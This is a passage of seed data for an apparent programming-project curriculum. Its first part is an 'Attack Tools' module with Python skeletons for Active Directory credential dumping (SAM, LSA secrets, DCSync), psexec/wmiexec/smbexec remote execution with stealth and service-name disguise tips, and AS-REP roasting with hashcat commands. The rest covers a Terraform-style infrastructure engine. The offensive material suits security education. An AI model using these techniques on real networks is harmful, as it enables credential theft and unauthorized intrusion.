    def bind_ntlm(self, domain, username, password):
        self.conn = ldap3.Connection(
            self.server,
            user=f"{domain}\\\\{username}",
            password=password,
            authentication=ldap3.NTLM
        )
        return self.conn.bind()

    def bind_kerberos(self):
        self.conn = ldap3.Connection(
            self.server,
            authentication=ldap3.SASL,
            sasl_mechanism=ldap3.KERBEROS
        )
        return self.conn.bind()
\`\`\`

### Search Operations
\`\`\`python
def search_users(self, base_dn):
    self.conn.search(
        search_base=base_dn,
        search_filter='(objectClass=user)',
        search_scope=ldap3.SUBTREE,
        attributes=['sAMAccountName', 'mail', 'memberOf', 'userAccountControl']
    )
    return self.conn.entries

def search_with_filter(self, base_dn, filter_str, attrs=['*']):
    self.conn.search(
        search_base=base_dn,
        search_filter=filter_str,
        attributes=attrs
    )
    return self.conn.entries

# Common queries
def get_domain_admins(self, base_dn):
    return self.search_with_filter(
        base_dn,
        '(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,' + base_dn + '))'
    )

def get_computers(self, base_dn):
    return self.search_with_filter(
        base_dn,
        '(objectClass=computer)',
        ['name', 'operatingSystem', 'lastLogon']
    )
\`\`\`

### Paged Results
\`\`\`python
def search_paged(self, base_dn, filter_str, page_size=1000):
    all_entries = []

    cookie = None
    while True:
        self.conn.search(
            search_base=base_dn,
            search_filter=filter_str,
            search_scope=ldap3.SUBTREE,
            attributes=['*'],
            paged_size=page_size,
            paged_cookie=cookie
        )

        all_entries.extend(self.conn.entries)

        # Get cookie for next page
        cookie = self.conn.result['controls']['1.2.840.113556.1.4.319']['value']['cookie']
        if not cookie:
            break

    return all_entries
\`\`\`

### Useful AD Queries
\`\`\`python
# Users with SPN (Kerberoastable)
'(&(objectClass=user)(servicePrincipalName=*))'

# Users without pre-auth (AS-REP roastable)
'(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'

# Unconstrained delegation
'(userAccountControl:1.2.840.113556.1.4.803:=524288)'

# Domain controllers
'(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))'

# GPOs
'(objectClass=groupPolicyContainer)'
\`\`\`

## Completion Criteria
- [ ] LDAP bind (simple, NTLM, Kerberos)
- [ ] Search with filters
- [ ] Paged results for large datasets
- [ ] Common AD enumeration queries`],
			]);
			modId = getOrCreateModule(p.id, 'Attack Tools', 'Offensive capabilities', 21);
			addTasksToModule(modId, [
				['Build secretsdump', 'Extract credentials remotely: SAM via registry (local accounts), LSA secrets (service passwords), cached domain creds, NTDS.dit via DCSync. No local code execution needed.',
`## Remote Credential Extraction

### SAM via Registry
\`\`\`python
class SecretsDump:
    def __init__(self, smb_client, rpc_client):
        self.smb = smb_client
        self.rpc = rpc_client

    def dump_sam(self):
        # Connect to remote registry
        self.rpc.bind(WINREG_UUID)

        # Open HKLM
        hklm = self.rpc.call(REG_OPEN_HKLM)

        # Open SAM and SYSTEM hives
        sam_key = self.rpc.call(REG_OPEN_KEY, hklm, "SAM")
        system_key = self.rpc.call(REG_OPEN_KEY, hklm, "SYSTEM")

        # Get boot key from SYSTEM
        boot_key = self.get_boot_key(system_key)

        # Extract hashed boot key from SAM
        hashed_boot_key = self.get_hashed_boot_key(sam_key, boot_key)

        # Enumerate users and decrypt hashes
        users = self.enumerate_sam_users(sam_key, hashed_boot_key)
        return users
\`\`\`

### LSA Secrets
\`\`\`python
def dump_lsa_secrets(self):
    # Open LSA\\Policy\\Secrets in registry
    secrets_key = self.rpc.call(REG_OPEN_KEY, hklm, "SECURITY\\\\Policy\\\\Secrets")

    secrets = {}
    for secret_name in self.enumerate_subkeys(secrets_key):
        # Each secret has CurrVal subkey with encrypted data
        encrypted = self.get_secret_value(secrets_key, secret_name)
        decrypted = self.decrypt_lsa_secret(encrypted, self.lsa_key)
        secrets[secret_name] = decrypted

    # Common secrets:
    # - $MACHINE.ACC: Machine account password
    # - _SC_<service>: Service account passwords
    # - DefaultPassword: Autologon password
    # - DPAPI_SYSTEM: DPAPI master key

    return secrets
\`\`\`

### DCSync (NTDS.dit)
\`\`\`python
def dcsync(self, domain, target_user=None):
    # Use DRSUAPI to replicate credentials like a DC
    self.rpc.bind(DRSUAPI_UUID)

    # Get domain NC
    domain_nc = f"DC={domain.replace('.', ',DC=')}"

    if target_user:
        # Single user
        return self.dcsync_user(domain_nc, target_user)
    else:
        # All users
        return self.dcsync_all(domain_nc)

def dcsync_user(self, domain_nc, username):
    # Build DRS_MSG_GETCHGREQ
    request = DRSUAPI_DRS_MSG_GETCHGREQ(
        uuidDsaObjDest=uuid.uuid4(),
        uuidInvocIdSrc=uuid.uuid4(),
        pNC=DSNAME(dn=f"CN={username},CN=Users,{domain_nc}"),
        ulFlags=DRS_INIT_SYNC | DRS_WRIT_REP
    )

    response = self.rpc.call(DRSUAPI_GETNCCHANGES, request)

    # Parse REPLENTINFLIST for user object
    # Extract: unicodePwd (NTLM hash), supplementalCredentials
    return self.parse_replication_data(response)
\`\`\`

## Completion Criteria
- [ ] Dump SAM via registry
- [ ] Extract LSA secrets
- [ ] Implement DCSync
- [ ] Parse all credential types`],

				['Implement psexec', 'Remote execution: copy service binary to ADMIN$, create service via SVCCTL RPC, start service, read output via named pipe. Clean up afterward.',
`## PsExec Implementation

### Service-Based Execution
\`\`\`python
class PsExec:
    def __init__(self, smb_client, rpc_client):
        self.smb = smb_client
        self.rpc = rpc_client
        self.service_name = self.random_name()

    def execute(self, command):
        # 1. Connect to ADMIN$ share
        self.smb.tree_connect("ADMIN$")

        # 2. Upload service executable
        service_binary = self.create_service_wrapper(command)
        remote_path = f"{self.service_name}.exe"
        self.smb.put_file(remote_path, service_binary)

        # 3. Connect to SVCCTL (Service Control Manager)
        self.rpc.bind(SVCCTL_UUID)

        # 4. Open SCM
        scm_handle = self.rpc.call(
            SVCCTL_OPEN_SC_MANAGER,
            machine_name=None,
            database_name=None,
            desired_access=SC_MANAGER_ALL_ACCESS
        )

        # 5. Create service
        service_handle = self.rpc.call(
            SVCCTL_CREATE_SERVICE,
            scm_handle=scm_handle,
            service_name=self.service_name,
            display_name=self.service_name,
            binary_path=f"%SystemRoot%\\\\{remote_path}",
            service_type=SERVICE_WIN32_OWN_PROCESS,
            start_type=SERVICE_DEMAND_START
        )

        # 6. Start service
        self.rpc.call(SVCCTL_START_SERVICE, service_handle)

        # 7. Read output from named pipe
        output = self.read_output_pipe()

        # 8. Cleanup
        self.cleanup(scm_handle, service_handle, remote_path)

        return output
\`\`\`

### Output via Named Pipe
\`\`\`python
def create_service_wrapper(self, command):
    # Service that executes command and writes output to pipe
    # Minimal service binary that:
    # 1. Creates named pipe
    # 2. Executes cmd.exe /c {command}
    # 3. Redirects output to pipe
    # 4. Exits

    pipe_name = f"\\\\\\\\\\\\\\\\localhost\\\\pipe\\\\{self.service_name}"
    return compile_service(command, pipe_name)

def read_output_pipe(self):
    pipe_path = f"\\\\\\\\{self.target}\\\\pipe\\\\{self.service_name}"

    # Connect via SMB
    self.smb.tree_connect("IPC$")
    pipe_handle = self.smb.create(pipe_path, GENERIC_READ)

    output = b''
    while True:
        try:
            chunk = self.smb.read(pipe_handle, 4096)
            output += chunk
        except:
            break

    return output.decode()
\`\`\`

### Cleanup
\`\`\`python
def cleanup(self, scm_handle, service_handle, remote_path):
    # Stop service (if still running)
    try:
        self.rpc.call(SVCCTL_STOP_SERVICE, service_handle)
    except:
        pass

    # Delete service
    self.rpc.call(SVCCTL_DELETE_SERVICE, service_handle)
    self.rpc.call(SVCCTL_CLOSE_SERVICE_HANDLE, service_handle)
    self.rpc.call(SVCCTL_CLOSE_SERVICE_HANDLE, scm_handle)

    # Delete binary
    self.smb.delete_file(f"ADMIN$\\\\{remote_path}")
\`\`\`

## Completion Criteria
- [ ] Upload service binary
- [ ] Create and start service
- [ ] Read output from pipe
- [ ] Clean up all artifacts`],

				['Add wmiexec', 'Execute via WMI Win32_Process.Create(). Semi-interactive shell. Redirect output to file on C$ share, read back, delete. Stealthier than psexec (no service creation).',
`## WMI Execution

### Win32_Process.Create
\`\`\`python
class WMIExec:
    def __init__(self, dcom_client, smb_client):
        self.dcom = dcom_client
        self.smb = smb_client
        self.output_file = f"__output_{random.randint(1000,9999)}"

    def execute(self, command):
        # Connect to WMI via DCOM
        self.dcom.connect()

        # Get IWbemServices interface
        wmi = self.dcom.get_object("winmgmts:")

        # Build command with output redirect
        # cmd.exe /Q /c {command} > \\\\127.0.0.1\\C$\\Windows\\Temp\\{output} 2>&1
        full_cmd = f'cmd.exe /Q /c {command} > \\\\\\\\127.0.0.1\\\\C$\\\\Windows\\\\Temp\\\\{self.output_file} 2>&1'

        # Call Win32_Process.Create
        result = wmi.call(
            "Win32_Process",
            "Create",
            CommandLine=full_cmd,
            CurrentDirectory="C:\\\\Windows\\\\System32"
        )

        if result['ReturnValue'] != 0:
            raise Exception(f"Process creation failed: {result['ReturnValue']}")

        # Wait for process and read output
        output = self.read_and_cleanup()
        return output
\`\`\`

### Semi-Interactive Shell
\`\`\`python
def shell(self):
    print(f"[*] Semi-interactive shell (output may be delayed)")

    while True:
        try:
            cmd = input("WMI> ")
            if cmd.lower() in ['exit', 'quit']:
                break

            output = self.execute(cmd)
            print(output)

        except KeyboardInterrupt:
            break
\`\`\`

### Output Retrieval
\`\`\`python
def read_and_cleanup(self, timeout=5):
    output_path = f"Windows\\\\Temp\\\\{self.output_file}"

    # Connect to C$ share
    self.smb.tree_connect("C$")

    # Wait for output file
    start = time.time()
    while time.time() - start < timeout:
        try:
            output = self.smb.read_file(output_path)
            break
        except FileNotFoundError:
            time.sleep(0.5)
    else:
        return "[!] Timeout waiting for output"

    # Delete output file
    self.smb.delete_file(output_path)

    return output.decode()
\`\`\`

### Stealth Considerations
\`\`\`
WMIExec advantages:
- No binary uploaded to disk
- No service created
- Uses legitimate Windows management

Artifacts:
- WMI provider host process spawns cmd.exe
- Output file briefly on disk
- DCOM network traffic

Detection:
- WMI Win32_Process.Create events
- Parent-child process chain
- Network connection to DCOM port
\`\`\`

## Completion Criteria
- [ ] DCOM/WMI connection
- [ ] Win32_Process.Create
- [ ] Output redirection and retrieval
- [ ] Interactive shell mode`],

				['Build smbexec', 'Create service with cmd.exe command, output to share. No binary upload. Most stealthy of exec methods. Service name randomization.',
`## SMBExec Implementation

### Service Command Execution
\`\`\`python
class SMBExec:
    def __init__(self, smb_client, rpc_client):
        self.smb = smb_client
        self.rpc = rpc_client
        self.share = "C$"
        self.output_path = f"Windows\\\\Temp\\\\__output_{random.randint(1000,9999)}"

    def execute(self, command):
        # No binary upload - use cmd.exe directly as service binary
        # Service binary: %COMSPEC% /Q /c echo {command} > {output} 2>&1
        service_name = self.random_name()

        # Build command
        cmd = f'%COMSPEC% /Q /c echo {command} > \\\\\\\\127.0.0.1\\\\{self.share}\\\\{self.output_path} 2>&1'

        # Connect to SVCCTL
        self.rpc.bind(SVCCTL_UUID)

        # Open SCM
        scm_handle = self.rpc.call(SVCCTL_OPEN_SC_MANAGER)

        # Create service (will fail to start but command executes)
        service_handle = self.rpc.call(
            SVCCTL_CREATE_SERVICE,
            scm_handle=scm_handle,
            service_name=service_name,
            display_name=service_name,
            binary_path=cmd,  # cmd.exe as "binary"
            service_type=SERVICE_WIN32_OWN_PROCESS,
            start_type=SERVICE_DEMAND_START
        )

        # Start service - will execute command then "fail"
        try:
            self.rpc.call(SVCCTL_START_SERVICE, service_handle)
        except:
            pass  # Expected - cmd.exe isn't a proper service

        # Read output
        output = self.read_output()

        # Cleanup
        self.rpc.call(SVCCTL_DELETE_SERVICE, service_handle)
        self.smb.delete_file(f"{self.share}\\\\{self.output_path}")

        return output
\`\`\`

### Interactive Shell
\`\`\`python
def shell(self):
    while True:
        cmd = input("SMB> ")
        if cmd.lower() in ['exit', 'quit']:
            break

        # Execute through service
        output = self.execute(cmd)
        print(output)
\`\`\`

### Advantages
\`\`\`
SMBExec vs PsExec vs WMIExec:

SMBExec:
+ No binary upload
+ No persistent service binary
+ Uses built-in cmd.exe
- Service creation events
- Brief service existence

PsExec:
- Uploads binary
- Creates service
- Binary on disk
+ More reliable

WMIExec:
+ No service creation
+ No binary
- DCOM complexity
- WMI events
\`\`\`

### Stealth Enhancements
\`\`\`python
def random_name(self):
    # Use realistic-looking service names
    prefixes = ['BTOBEX', 'BDESVC', 'CscService', 'DsmSvc']
    return random.choice(prefixes) + ''.join(random.choices(string.digits, k=4))

def cleanup_all(self):
    # Ensure no orphaned services or files
    # Delete output file
    try:
        self.smb.delete_file(f"{self.share}\\\\{self.output_path}")
    except:
        pass
\`\`\`

## Completion Criteria
- [ ] Service-based cmd execution
- [ ] No binary upload
- [ ] Output retrieval
- [ ] Clean service deletion`],

				['Implement GetNPUsers', 'AS-REP roasting: find users without Kerberos preauth (DONT_REQUIRE_PREAUTH flag), request AS-REP, extract encrypted timestamp for offline cracking.',
`## AS-REP Roasting

### Find Vulnerable Users
\`\`\`python
class GetNPUsers:
    def __init__(self, domain, dc_ip):
        self.domain = domain
        self.dc = dc_ip

    def get_users_no_preauth(self, ldap_client):
        # LDAP query for users with DONT_REQUIRE_PREAUTH
        # userAccountControl bit 0x400000 (4194304)
        filter_str = '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'

        ldap_client.search(
            search_base=f'DC={self.domain.replace(".", ",DC=")}',
            search_filter=filter_str,
            attributes=['sAMAccountName']
        )

        return [entry.sAMAccountName.value for entry in ldap_client.entries]
\`\`\`

### Request AS-REP Without Pre-Auth
\`\`\`python
def roast_user(self, username):
    # Build AS-REQ without pre-auth data
    client_name = PrincipalName(NT_PRINCIPAL, [username])
    server_name = PrincipalName(NT_SRV_INST, ['krbtgt', self.domain])

    as_req = AS_REQ(
        pvno=5,
        msg_type=KRB_AS_REQ,
        padata=[],  # No pre-auth!
        req_body=KDCReqBody(
            kdc_options=KDCOptions(['forwardable', 'renewable']),
            cname=client_name,
            realm=self.domain,
            sname=server_name,
            till=datetime(2037, 12, 31),
            nonce=random.getrandbits(32),
            etype=[ETYPE_AES256, ETYPE_AES128, ETYPE_RC4]
        )
    )

    # Send to KDC
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(as_req.dump(), (self.dc, 88))
    response = sock.recv(4096)

    # Parse response
    as_rep = AS_REP.load(response)
    return as_rep
\`\`\`

### Extract Hash for Cracking
\`\`\`python
def extract_hash(self, as_rep, username):
    # Get encrypted part (enc-part)
    enc_part = as_rep['enc-part']
    cipher = enc_part['cipher']
    etype = enc_part['etype']

    # Format for hashcat/john
    if etype == ETYPE_RC4:
        # $krb5asrep$username@DOMAIN:cipher
        hash_str = f"$krb5asrep${username}@{self.domain}:{cipher.hex()}"
    elif etype in [ETYPE_AES128, ETYPE_AES256]:
        # $krb5asrep$23$username@DOMAIN:cipher
        hash_str = f"$krb5asrep$23${username}@{self.domain}:{cipher.hex()}"

    return hash_str

def roast_all(self, userlist=None, ldap_client=None):
    if userlist is None and ldap_client:
        userlist = self.get_users_no_preauth(ldap_client)

    hashes = []
    for user in userlist:
        try:
            as_rep = self.roast_user(user)
            hash_str = self.extract_hash(as_rep, user)
            hashes.append(hash_str)
            print(f"[+] Got hash for {user}")
        except KerberosError as e:
            if e.error_code == KDC_ERR_PREAUTH_REQUIRED:
                print(f"[-] {user} requires pre-auth")
            else:
                print(f"[-] Error for {user}: {e}")

    return hashes
\`\`\`

### Crack with Hashcat
\`\`\`bash
# RC4 (type 23)
hashcat -m 18200 hashes.txt wordlist.txt

# Rule-based attack
hashcat -m 18200 hashes.txt wordlist.txt -r rules/best64.rule
\`\`\`

## Completion Criteria
- [ ] Find users without preauth
- [ ] Request AS-REP
- [ ] Extract crackable hash
- [ ] Format for hashcat/john`],
			]);
		} else if (p.name.includes('Terraform') || p.name.includes('Infrastructure')) {
			let modId = getOrCreateModule(p.id, 'Core Engine', 'Main functionality', 20);
			addTasksToModule(modId, [
				['Build resource graph', 'Parse HCL configuration, build DAG of resources based on dependencies (references, depends_on). Topological sort for execution order. Detect cycles.',
`## Resource Graph Construction

### Parse Configuration
\`\`\`go
type Resource struct {
    Type       string
    Name       string
    Config     map[string]interface{}
    DependsOn  []string
    References []string  // Extracted from config values
}

func ParseHCL(config string) ([]Resource, error) {
    file, diags := hclparse.NewParser().ParseHCL([]byte(config), "main.tf")
    if diags.HasErrors() {
        return nil, diags
    }

    var resources []Resource
    body := file.Body.(*hclsyntax.Body)

    for _, block := range body.Blocks {
        if block.Type == "resource" {
            res := Resource{
                Type: block.Labels[0],
                Name: block.Labels[1],
            }
            res.Config = parseBlockBody(block.Body)
            res.References = extractReferences(res.Config)
            resources = append(resources, res)
        }
    }
    return resources, nil
}
\`\`\`

### Build Dependency Graph
\`\`\`go
type Graph struct {
    nodes map[string]*Node
    edges map[string][]string  // from -> [to, to, ...]
}

type Node struct {
    Resource *Resource
    State    *ResourceState
}

func BuildGraph(resources []Resource) *Graph {
    g := &Graph{
        nodes: make(map[string]*Node),
        edges: make(map[string][]string),
    }

    // Add all nodes
    for _, res := range resources {
        id := fmt.Sprintf("%s.%s", res.Type, res.Name)
        g.nodes[id] = &Node{Resource: &res}
    }

    // Add edges from references
    for _, res := range resources {
        id := fmt.Sprintf("%s.%s", res.Type, res.Name)
        for _, ref := range res.References {
            g.edges[ref] = append(g.edges[ref], id)  // ref -> id
        }
        for _, dep := range res.DependsOn {
            g.edges[dep] = append(g.edges[dep], id)
        }
    }

    return g
}
\`\`\`

### Topological Sort
\`\`\`go
func (g *Graph) TopologicalSort() ([]string, error) {
    // Kahn's algorithm
    inDegree := make(map[string]int)
    for id := range g.nodes {
        inDegree[id] = 0
    }
    for _, edges := range g.edges {
        for _, to := range edges {
            inDegree[to]++
        }
    }

    // Start with nodes that have no dependencies
    queue := []string{}
    for id, degree := range inDegree {
        if degree == 0 {
            queue = append(queue, id)
        }
    }

    var sorted []string
    for len(queue) > 0 {
        node := queue[0]
        queue = queue[1:]
        sorted = append(sorted, node)

        for _, dependent := range g.edges[node] {
            inDegree[dependent]--
            if inDegree[dependent] == 0 {
                queue = append(queue, dependent)
            }
        }
    }

    // Detect cycles
    if len(sorted) != len(g.nodes) {
        return nil, errors.New("cycle detected in resource graph")
    }

    return sorted, nil
}
\`\`\`

## Completion Criteria
- [ ] Parse HCL configuration
- [ ] Extract resource references
- [ ] Build dependency DAG
- [ ] Detect cycles`],

				['Implement plan phase', 'Compare desired state (config) with current state (state file). Generate diff: resources to create, update, or destroy. Show human-readable plan output.',
`## Plan Phase Implementation

### State Comparison
\`\`\`go
type Plan struct {
    Creates  []*ResourceChange
    Updates  []*ResourceChange
    Destroys []*ResourceChange
}

type ResourceChange struct {
    ResourceID string
    Type       string
    Name       string
    Before     map[string]interface{}  // Current state
    After      map[string]interface{}  // Desired state
    Diff       map[string]AttributeDiff
}

type AttributeDiff struct {
    Old       string
    New       string
    Sensitive bool
    Computed  bool  // Will be known after apply
}

func GeneratePlan(config []Resource, state *State) *Plan {
    plan := &Plan{}

    configMap := make(map[string]*Resource)
    for _, res := range config {
        id := fmt.Sprintf("%s.%s", res.Type, res.Name)
        configMap[id] = &res
    }

    // Check each resource in config
    for id, res := range configMap {
        existing := state.Resources[id]

        if existing == nil {
            // Resource doesn't exist - CREATE
            plan.Creates = append(plan.Creates, &ResourceChange{
                ResourceID: id,
                Type:       res.Type,
                Name:       res.Name,
                After:      res.Config,
            })
        } else {
            // Resource exists - check for changes
            diff := computeDiff(existing.Attributes, res.Config)
            if len(diff) > 0 {
                plan.Updates = append(plan.Updates, &ResourceChange{
                    ResourceID: id,
                    Before:     existing.Attributes,
                    After:      res.Config,
                    Diff:       diff,
                })
            }
        }
    }

    // Check for resources to destroy (in state but not config)
    for id, res := range state.Resources {
        if _, exists := configMap[id]; !exists {
            plan.Destroys = append(plan.Destroys, &ResourceChange{
                ResourceID: id,
                Before:     res.Attributes,
            })
        }
    }

    return plan
}
\`\`\`

### Plan Output
\`\`\`go
func (p *Plan) Print() {
    fmt.Println("Terraform will perform the following actions:\\n")

    for _, c := range p.Creates {
        fmt.Printf("  # %s will be created\\n", c.ResourceID)
        fmt.Printf("  + resource \\"%s\\" \\"%s\\" {\\n", c.Type, c.Name)
        for k, v := range c.After {
            fmt.Printf("      + %s = \\"%v\\"\\n", k, v)
        }
        fmt.Println("    }")
    }

    for _, c := range p.Updates {
        fmt.Printf("  # %s will be updated in-place\\n", c.ResourceID)
        fmt.Printf("  ~ resource \\"%s\\" \\"%s\\" {\\n", c.Type, c.Name)
        for k, d := range c.Diff {
            fmt.Printf("      ~ %s = \\"%s\\" -> \\"%s\\"\\n", k, d.Old, d.New)
        }
        fmt.Println("    }")
    }

    for _, c := range p.Destroys {
        fmt.Printf("  # %s will be destroyed\\n", c.ResourceID)
        fmt.Printf("  - resource \\"%s\\" \\"%s\\"\\n", c.Type, c.Name)
    }

    fmt.Printf("\\nPlan: %d to add, %d to change, %d to destroy.\\n",
        len(p.Creates), len(p.Updates), len(p.Destroys))
}
\`\`\`

## Completion Criteria
- [ ] Compare config with state
- [ ] Detect creates, updates, destroys
- [ ] Compute attribute diffs
- [ ] Human-readable plan output`],

				['Add apply phase', 'Execute plan: create/update/destroy resources via provider APIs. Update state file after each operation. Handle errors with partial state. Parallelism where possible.',
`## Apply Phase Implementation

### Execute Plan
\`\`\`go
type ApplyResult struct {
    ResourceID string
    Success    bool
    Error      error
    NewState   map[string]interface{}
}

func ApplyPlan(plan *Plan, providers map[string]Provider, state *State) error {
    // Sort changes by dependency order
    order := topologicalSort(plan)

    for _, change := range order {
        var result ApplyResult

        switch change.Action {
        case ActionCreate:
            result = applyCreate(change, providers)
        case ActionUpdate:
            result = applyUpdate(change, providers)
        case ActionDestroy:
            result = applyDestroy(change, providers)
        }

        // Update state immediately after each operation
        if result.Success {
            state.Resources[change.ResourceID] = &ResourceState{
                Attributes: result.NewState,
            }
        } else {
            // Save partial state and return error
            state.Save()
            return fmt.Errorf("error applying %s: %v", change.ResourceID, result.Error)
        }
    }

    state.Save()
    return nil
}

func applyCreate(change *ResourceChange, providers map[string]Provider) ApplyResult {
    provider := providers[change.Type]

    newState, err := provider.Create(change.After)
    if err != nil {
        return ApplyResult{Error: err}
    }

    fmt.Printf("%s: Creation complete\\n", change.ResourceID)
    return ApplyResult{Success: true, NewState: newState}
}
\`\`\`

### Parallelism
\`\`\`go
func ApplyParallel(plan *Plan, parallelism int) error {
    // Group resources by dependency level
    levels := groupByLevel(plan)

    for _, level := range levels {
        // Apply all resources in this level in parallel
        sem := make(chan struct{}, parallelism)
        errChan := make(chan error, len(level))

        for _, change := range level {
            sem <- struct{}{}
            go func(c *ResourceChange) {
                defer func() { <-sem }()
                result := apply(c)
                if !result.Success {
                    errChan <- result.Error
                }
            }(change)
        }

        // Wait for level to complete
        // Check for errors
    }

    return nil
}
\`\`\`

### Error Handling
\`\`\`go
func applyWithRetry(change *ResourceChange, maxRetries int) ApplyResult {
    var lastErr error

    for i := 0; i < maxRetries; i++ {
        result := apply(change)
        if result.Success {
            return result
        }

        lastErr = result.Error
        if !isRetryable(result.Error) {
            break
        }

        time.Sleep(time.Duration(i+1) * time.Second)
    }

    return ApplyResult{Error: lastErr}
}
\`\`\`

## Completion Criteria
- [ ] Execute creates, updates, destroys
- [ ] Update state after each operation
- [ ] Handle partial failures
- [ ] Parallel execution`],

				['Build destroy phase', 'Reverse dependency order. Destroy all managed resources. Update state to empty. Handle destroy-time provisioners. Confirm destructive action.',
`## Destroy Phase

### Reverse Dependency Order
\`\`\`go
func PlanDestroy(state *State) *Plan {
    plan := &Plan{}

    // All resources in state will be destroyed
    for id, res := range state.Resources {
        plan.Destroys = append(plan.Destroys, &ResourceChange{
            ResourceID: id,
            Type:       res.Type,
            Name:       res.Name,
            Before:     res.Attributes,
        })
    }

    // Sort in reverse dependency order
    // Resources that depend on others must be destroyed first
    plan.Destroys = reverseTopologicalSort(plan.Destroys)

    return plan
}

func reverseTopologicalSort(changes []*ResourceChange) []*ResourceChange {
    // Build graph
    graph := buildDependencyGraph(changes)

    // Get topological order, then reverse it
    order := graph.TopologicalSort()
    reverse(order)

    // Map back to changes
    result := make([]*ResourceChange, len(order))
    changeMap := make(map[string]*ResourceChange)
    for _, c := range changes {
        changeMap[c.ResourceID] = c
    }
    for i, id := range order {
        result[i] = changeMap[id]
    }

    return result
}
\`\`\`

### Execute Destroy
\`\`\`go
func ApplyDestroy(plan *Plan, providers map[string]Provider, state *State) error {
    // Confirm destructive action
    if !confirm("Do you really want to destroy all resources?") {
        return errors.New("destroy cancelled")
    }

    for _, change := range plan.Destroys {
        provider := providers[change.Type]

        // Run destroy-time provisioners first
        if provisioners := change.Before["provisioner"]; provisioners != nil {
            for _, p := range provisioners.([]interface{}) {
                prov := p.(map[string]interface{})
                if prov["when"] == "destroy" {
                    runProvisioner(prov)
                }
            }
        }

        // Destroy resource
        err := provider.Delete(change.Before)
        if err != nil {
            fmt.Printf("%s: Destruction failed: %v\\n", change.ResourceID, err)
            return err
        }

        // Remove from state
        delete(state.Resources, change.ResourceID)
        fmt.Printf("%s: Destruction complete\\n", change.ResourceID)
    }

    state.Save()
    return nil
}
\`\`\`

### Targeted Destroy
\`\`\`go
func PlanTargetedDestroy(state *State, targets []string) *Plan {
    plan := &Plan{}

    for _, target := range targets {
        if res, exists := state.Resources[target]; exists {
            plan.Destroys = append(plan.Destroys, &ResourceChange{
                ResourceID: target,
                Before:     res.Attributes,
            })

            // Also destroy dependents
            dependents := findDependents(state, target)
            for _, dep := range dependents {
                plan.Destroys = append(plan.Destroys, &ResourceChange{
                    ResourceID: dep,
                    Before:     state.Resources[dep].Attributes,
                })
            }
        }
    }

    return plan
}
\`\`\`

## Completion Criteria
- [ ] Reverse dependency order
- [ ] Run destroy provisioners
- [ ] Confirm before destroy
- [ ] Targeted destroy support`],

				['Implement refresh', 'Read current state of all resources from provider APIs. Update state file to match reality. Detect drift from desired configuration.',
`## State Refresh

### Read Current State
\`\`\`go
func Refresh(state *State, providers map[string]Provider) (*RefreshResult, error) {
    result := &RefreshResult{
        Updated: make(map[string]*ResourceState),
        Removed: []string{},
        Drifted: []string{},
    }

    for id, res := range state.Resources {
        provider := providers[res.Type]

        // Read current state from provider
        current, err := provider.Read(res.Attributes["id"])
        if err != nil {
            if isNotFoundError(err) {
                // Resource was deleted outside of Terraform
                result.Removed = append(result.Removed, id)
                delete(state.Resources, id)
                continue
            }
            return nil, fmt.Errorf("error reading %s: %v", id, err)
        }

        // Compare with stored state
        if !reflect.DeepEqual(current, res.Attributes) {
            result.Drifted = append(result.Drifted, id)
            result.Updated[id] = &ResourceState{
                Type:       res.Type,
                Attributes: current,
            }
            state.Resources[id].Attributes = current
        }
    }

    state.Save()
    return result, nil
}
\`\`\`

### Drift Detection
\`\`\`go
type RefreshResult struct {
    Updated map[string]*ResourceState
    Removed []string
    Drifted []string
}

func (r *RefreshResult) Print() {
    if len(r.Removed) > 0 {
        fmt.Println("The following resources no longer exist:")
        for _, id := range r.Removed {
            fmt.Printf("  - %s\\n", id)
        }
    }

    if len(r.Drifted) > 0 {
        fmt.Println("\\nThe following resources have drifted from state:")
        for _, id := range r.Drifted {
            fmt.Printf("  ~ %s\\n", id)
        }
    }

    if len(r.Removed) == 0 && len(r.Drifted) == 0 {
        fmt.Println("No changes detected.")
    }
}

func DetectDrift(config []Resource, state *State) map[string][]AttributeDiff {
    drifts := make(map[string][]AttributeDiff)

    for _, res := range config {
        id := fmt.Sprintf("%s.%s", res.Type, res.Name)
        if stored := state.Resources[id]; stored != nil {
            diff := computeDiff(res.Config, stored.Attributes)
            if len(diff) > 0 {
                drifts[id] = diff
            }
        }
    }

    return drifts
}
\`\`\`

### Provider Read Interface
\`\`\`go
type Provider interface {
    Read(id string) (map[string]interface{}, error)
    Create(config map[string]interface{}) (map[string]interface{}, error)
    Update(id string, config map[string]interface{}) (map[string]interface{}, error)
    Delete(current map[string]interface{}) error
    Exists(id string) (bool, error)
}

// Example AWS provider Read
func (p *AWSProvider) Read(id string) (map[string]interface{}, error) {
    result, err := p.ec2.DescribeInstances(&ec2.DescribeInstancesInput{
        InstanceIds: []*string{aws.String(id)},
    })
    if err != nil {
        return nil, err
    }

    instance := result.Reservations[0].Instances[0]
    return map[string]interface{}{
        "id":            *instance.InstanceId,
        "instance_type": *instance.InstanceType,
        "ami":           *instance.ImageId,
        "tags":          convertTags(instance.Tags),
    }, nil
}
\`\`\`

## Completion Criteria
- [ ] Read current state from providers
- [ ] Update state file
- [ ] Detect removed resources
- [ ] Report drift from config`],
			]);
			modId = getOrCreateModule(p.id, 'Provider System', 'Cloud integrations', 21);
			addTasksToModule(modId, [
				['Design provider interface', 'Define CRUD operations: Create, Read, Update, Delete, Exists. Provider initializes with credentials. Returns resource data or errors. Plugin architecture.',
`## Provider Interface Design

### Provider Interface
\`\`\`go
type Provider interface {
    // Initialize provider with configuration
    Configure(config map[string]interface{}) error

    // Resource operations
    GetSchema() *ProviderSchema
    Resources() map[string]Resource
    DataSources() map[string]DataSource
}

type Resource interface {
    Schema() *ResourceSchema

    Create(ctx context.Context, config ResourceData) (*ResourceData, error)
    Read(ctx context.Context, id string) (*ResourceData, error)
    Update(ctx context.Context, id string, config ResourceData) (*ResourceData, error)
    Delete(ctx context.Context, id string) error
    Exists(ctx context.Context, id string) (bool, error)
}

type ResourceData struct {
    ID         string
    Attributes map[string]interface{}
}
\`\`\`

### Example Provider Implementation
\`\`\`go
type AWSProvider struct {
    region    string
    accessKey string
    secretKey string
    ec2       *ec2.EC2
    s3        *s3.S3
}

func (p *AWSProvider) Configure(config map[string]interface{}) error {
    p.region = config["region"].(string)
    p.accessKey = config["access_key"].(string)
    p.secretKey = config["secret_key"].(string)

